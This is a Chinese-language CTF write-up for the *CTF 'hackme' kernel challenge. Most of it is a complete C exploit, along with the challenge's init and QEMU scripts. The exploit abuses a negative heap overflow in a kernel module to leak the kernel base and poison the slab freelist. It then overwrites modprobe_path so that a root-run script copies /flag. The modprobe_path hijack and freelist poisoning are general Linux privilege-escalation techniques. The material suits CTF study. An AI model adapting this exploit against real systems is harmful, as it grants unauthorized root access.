# starctf-hackme

漏洞比较简单，堆块负向溢出

修改一下 init 脚本和启动脚本

```shell
#!/bin/sh

echo "CiAgICAgICAgIyAgICMgICAgIyMjIyAgICAjIyMjIyAgIyMjIyMjCiAgICAgICAgICMgIyAgICAj
ICAgICMgICAgICMgICAgIwogICAgICAgIyMjICMjIyAgIyAgICAgICAgICAjICAgICMjIyMjCiAg
ICAgICAgICMgIyAgICAjICAgICAgICAgICMgICAgIwogICAgICAgICMgICAjICAgIyAgICAjICAg
ICAjICAgICMKICAgICAgICAgICAgICAgICAjIyMjICAgICAgIyAgICAjCgo=" | base64 -d

mount -t proc none /proc
mount -t devtmpfs none /dev
mkdir /dev/pts
mount /dev/pts
chown 0 /flag
chmod 400 /flag
insmod /home/pwn/hackme.ko
chmod 644 /dev/hackme

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict

cd /home/pwn
chown -R 1000:1000 .
cd /
setsid cttyhack setuidgid 1000 sh

umount /proc
poweroff -f
```

```shell
gcc exp.c -static -o ./fs/exp
# sudo chmod a+x c.sh
# ./c.sh
cd fs
find . | cpio -o --format=newc > ../rootfs.cpio
cd ..

qemu-system-x86_64 \
    -m 512M \
    -nographic \
    -kernel bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -smp cores=4,threads=2 \
    -cpu qemu64,smep,smap 2>/dev/null \
    -s

```

这边直接使用 堆块任意申请原语 申请到 modprobe_path 修改成自己的脚本路径，随后输出 flag

> 这边有一个小小的坑，任意申请原语后会破坏 freelist，需要 free 几个堆块修复一下，不然就会报错

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <signal.h>

size_t vmlinux_base = 0xffffffff81000000;
size_t modprobe_path = 0x83f960; 

int fd = 0;

struct args{
    unsigned int index;
    unsigned int padding;
    char *data;
    size_t size;
    size_t offset;
} typedef args;

void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m\033[35m\033[1m%#lx \033[0m\n", s, address);
    else printf("\033[34m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void add(unsigned index, size_t size , char *data ){
    args cmd ;
    cmd.index = index;
    cmd.size = size;
    cmd.data = data;
    ioctl(fd , 0x30000 , &cmd );
    info("Create a chunk",0);
}

void delete(unsigned int index ){
    args cmd;
    cmd.index = index;
    ioctl(fd , 0x30001 , &cmd );
    info("Delete a chunk",0);
}

void edit (
    unsigned int index, 
    char * data , 
    size_t size ,
    size_t offset){
    args cmd;
    cmd.index = index;
    cmd.data = data;
    cmd.size = size;
    cmd.offset = offset;
    ioctl(fd , 0x30002 ,&cmd );
    info("Edit a chunk",0);
}

void show (
    unsigned int index, 
    char * data , 
    size_t size ,
    size_t offset){
    args cmd;
    cmd.index = index;
    cmd.data = data;
    cmd.size = size;
    cmd.offset = offset;
    ioctl(fd , 0x30003 ,&cmd );
    info("Show a chunk",0);
    info("Data" ,*(size_t *) cmd.data);
}

void get_flag(){
    info("Write command" ,0);

    system("echo '#!/bin/sh\ncp /flag /home/pwn/flag\nchmod 777 /home/pwn/flag' > /home/pwn/x");
    system("chmod +x /home/pwn/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
    system("chmod +x /home/pwn/dummy");

    info("Run unknown file" , 0);

    system("/home/pwn/dummy");
    system("cat /home/pwn/flag");

    exit(0);
}

int main(){
    
    size_t buf[0x100] = {0};
    fd = open("/dev/hackme", 0);

    add(0 ,0x100 , "aaaaa");
    add(1 ,0x10 , "aaaab");
    add(2 ,0x10 , "aaaac");
    add(3 ,0x10 , "aaaad");
    show(0 , (char *)buf , 0x100 , -0x100 + 0x30 );
    vmlinux_base =  buf[0] - 0x849ae0;

    modprobe_path += vmlinux_base;

    info("modprobe_path" , modprobe_path);

    delete(1);
    delete(2);

    buf[0] = modprobe_path;

    edit(3 , (char*)buf , 0x10 , -0x10);

    add(4 , 0x10 , "/home/pwn/x");
    add(5 , 0x10 , "/home/pwn/x");
    delete(4);
    delete(3);

    get_flag();

}
```

